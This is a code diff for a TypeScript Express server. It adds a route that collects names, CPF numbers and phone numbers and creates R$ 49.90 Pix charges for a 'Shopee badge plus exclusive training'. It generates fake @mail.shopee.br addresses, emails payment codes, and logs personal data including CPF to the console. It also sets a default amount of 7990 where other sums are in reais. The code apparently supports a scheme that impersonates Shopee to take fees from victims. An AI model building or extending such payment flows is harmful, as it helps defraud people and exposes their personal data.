@@ -1149,7 +1149,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
       
       // Usar o valor fornecido ou o valor padrão
-      const paymentAmount = amount || 119.70;
+      const paymentAmount = amount || 7990;
       
       // Usar o email fornecido ou gerar um
       const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
@@ -1400,6 +1400,109 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ 
         error: 'Erro ao buscar informações de pagamento', 
         details: error.message 
+      });
+    }
+  });
+  
+  // Rota específica para pagamentos de treinamento (R$ 49,90)
+  app.post('/api/payments/treinamento', async (req, res) => {
+    try {
+      // Verificar se a API For4Payments está configurada
+      if (!process.env.FOR4PAYMENTS_SECRET_KEY) {
+        console.error('ERRO: FOR4PAYMENTS_SECRET_KEY não configurada');
+        return res.status(500).json({
+          error: 'Serviço de pagamento não configurado. Configure a chave de API For4Payments.',
+        });
+      }
+
+      console.log('Dados de pagamento de treinamento recebidos:', req.body);
+      
+      // Validar dados da requisição
+      const { name, email, cpf, phone, items } = req.body;
+      
+      // Validação básica
+      if (!name) {
+        return res.status(400).json({ error: 'Nome é obrigatório.' });
+      }
+      
+      if (!cpf) {
+        return res.status(400).json({ error: 'CPF é obrigatório.' });
+      }
+      
+      // Valor fixo para o treinamento: R$ 49,90
+      const paymentAmount = 49.90;
+      
+      // Usar o email fornecido ou gerar um
+      const userEmail = email || `${name.toLowerCase().replace(/\s+/g, '.')}.${Date.now()}@mail.shopee.br`;
+      
+      console.log(`Processando pagamento de treinamento de R$ ${paymentAmount} para ${name}, CPF ${cpf}`);
+      
+      // Processar pagamento via For4Payments
+      const paymentResult = await paymentService.createPixPayment({
+        name,
+        email: userEmail,
+        cpf,
+        phone: phone || '',
+        amount: paymentAmount,
+        items: items || [{
+          title: "Crachá Shopee + Treinamento Exclusivo",
+          quantity: 1,
+          unitPrice: 4990,
+          tangible: false
+        }]
+      });
+      
+      console.log('Resultado do pagamento de treinamento For4Payments:', paymentResult);
+      
+      // Se o pagamento foi processado com sucesso, enviar email
+      if (paymentResult.pixCode && paymentResult.pixQrCode) {
+        // Importar o serviço de email
+        const { emailService } = await import('./email-service');
+        
+        // Formatar o valor para exibição
+        const formattedAmount = new Intl.NumberFormat('pt-BR', {
+          style: 'currency',
+          currency: 'BRL'
+        }).format(paymentAmount);
+        
+        // Construir o link para a página de pagamento (se houver)
+        const clientHost = getClientHost(req);
+        const paymentLink = `${clientHost}/payment?id=${paymentResult.id}&email=${encodeURIComponent(userEmail)}`;
+        console.log(`[EMAIL] Link de pagamento de treinamento gerado: ${paymentLink}`);
+        
+        // Enviar o email de confirmação
+        try {
+          const emailSent = await emailService.sendPaymentConfirmationEmail({
+            email: userEmail,
+            name,
+            pixCode: paymentResult.pixCode,
+            pixQrCode: paymentResult.pixQrCode,
+            amount: paymentAmount,
+            formattedAmount,
+            paymentLink
+          });
+          
+          // Adicionar informação de email enviado à resposta
+          paymentResult.emailSent = emailSent;
+          
+          if (emailSent) {
+            console.log(`Email de confirmação de treinamento enviado com sucesso para ${userEmail}`);
+          } else {
+            console.error(`Falha ao enviar email de confirmação de treinamento para ${userEmail}`);
+          }
+        } catch (emailError) {
+          console.error('Erro ao enviar email de confirmação de treinamento:', emailError);
+          paymentResult.emailSent = false;
+          paymentResult.emailError = 'Falha ao enviar email de confirmação';
+        }
+      }
+      
+      // Retornar resultado para o frontend
+      res.status(200).json(paymentResult);
+    } catch (error: any) {
+      console.error('Erro ao processar pagamento de treinamento:', error);
+      res.status(500).json({ 
+        error: error.message || 'Falha ao processar pagamento de treinamento.'
       });
     }
   });
